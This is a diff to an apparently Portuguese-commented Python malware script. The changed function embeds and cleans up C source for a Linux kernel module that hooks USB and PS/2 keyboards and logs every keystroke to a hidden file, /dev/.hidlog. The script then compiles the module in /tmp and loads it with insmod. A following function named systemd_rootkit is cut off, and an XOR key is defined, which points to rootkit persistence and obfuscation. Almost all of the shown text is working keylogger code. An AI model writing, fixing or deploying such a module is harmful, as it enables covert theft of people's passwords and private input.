@@ -20,39 +20,77 @@ XOR_KEY    = 0x9F
 
 # ---------- FUNÇÕES ORIGINAIS (MERGE 1+2) ---------- #
 def build_and_insert():
-    src = '''
-#include <linux/init.h>
-#include <linux/kernel.h>
+    src = '''#include <linux/init.h>
 #include <linux/module.h>
-#include <linux/hid.h>
 #include <linux/input.h>
-static struct input_handler kh;
-static void log_key(unsigned code, int down){
-    if(!down)return;
-    struct file*f=filp_open("/dev/.hidlog",O_WRONLY|O_APPEND|O_CREAT,0600);
-    if(!IS_ERR(f)){kernel_write(f,&code,1,&f->f_pos);filp_close(f,NULL);}
+#include <linux/uaccess.h>
+
+static void log_key(unsigned char c){
+    struct file *f = filp_open("/dev/.hidlog", O_WRONLY|O_APPEND|O_CREAT, 0600);
+    if(!IS_ERR(f)){
+        kernel_write(f, &c, 1, &f->f_pos);
+        filp_close(f, NULL);
+    }
 }
-static bool filter(struct input_handle*h,unsigned t,unsigned c,int v){
-    if(t==EV_KEY&&v>=0)log_key(c,v);return false;
+
+static bool filter(struct input_handle *h, unsigned int type, unsigned int code, int value){
+    if(type == EV_KEY && value >= 0) log_key((unsigned char)code);
+    return false;
 }
-static int connect(struct input_handler*h,struct input_dev*d,const struct input_device_id*i){
-    struct input_handle*hd=kzalloc(sizeof(*hd),GFP_KERNEL);
-    if(!hd)return-ENOMEM;
-    hd->dev=d;hd->handler=h;hd->name="evgrab";
-    input_register_handle(hd);input_open_device(hd);return 0;
+
+static int connect(struct input_handler *h, struct input_dev *dev, const struct input_device_id *id){
+    struct input_handle *handle = kzalloc(sizeof(*handle), GFP_KERNEL);
+    if(!handle) return -ENOMEM;
+    handle->dev  = dev;
+    handle->handler = h;
+    handle->name  = "evgrab";
+    input_register_handle(handle);
+    input_open_device(handle);
+    return 0;
 }
-static void disconnect(struct input_handle*hd){
-    input_close_device(hd);input_unregister_handle(hd);kfree(hd);
+
+static void disconnect(struct input_handle *handle){
+    input_close_device(handle);
+    input_unregister_handle(handle);
+    kfree(handle);
 }
-static const struct input_device_id ids[]={
-    {.flags=INPUT_DEVICE_ID_MATCH_BUS,.bustype=BUS_USB},
-    {.flags=INPUT_DEVICE_ID_MATCH_BUS,.bustype=BUS_I8042},{}
+
+static const struct input_device_id ids[] = {
+    {.flags = INPUT_DEVICE_ID_MATCH_BUS, .bustype = BUS_USB},
+    {.flags = INPUT_DEVICE_ID_MATCH_BUS, .bustype = BUS_I8042},
+    { }
 };
-module_input_handler(kh);
+MODULE_DEVICE_TABLE(input, ids);
+
+static struct input_handler evgrab_handler = {
+    .filter     = filter,
+    .connect    = connect,
+    .disconnect = disconnect,
+    .name       = "evgrab",
+    .id_table   = ids,
+};
+
+static int __init evgrab_init(void){
+    return input_register_handler(&evgrab_handler);
+}
+static void __exit evgrab_exit(void){
+    input_unregister_handler(&evgrab_handler);
+}
+module_init(evgrab_init);
+module_exit(evgrab_exit);
+MODULE_LICENSE("GPL");
 '''
-    with open("/tmp/k.c","w") as f:f.write(src)
-    subprocess.run(["make","-C",f"/lib/modules/{os.uname().release}/build","M=/tmp","modules"],check=True)
-    subprocess.run(["insmod","/tmp/k.ko"],check=True)
+    build_dir = Path("/tmp/kekw_lkm")
+    build_dir.mkdir(exist_ok=True)
+    (build_dir / "k.c").write_text(src)
+    (build_dir / "Makefile").write_text("obj-m := k.o\n")
+    subprocess.run(
+        ["make", "-C", f"/lib/modules/{os.uname().release}/build",
+         f"M={build_dir}", "modules"],
+        check=True
+    )
+    subprocess.run(["insmod", build_dir / "k.ko"], check=True)
+    print("[+] LKM carregado")
 
 def systemd_rootkit():
     unit="""[Unit]
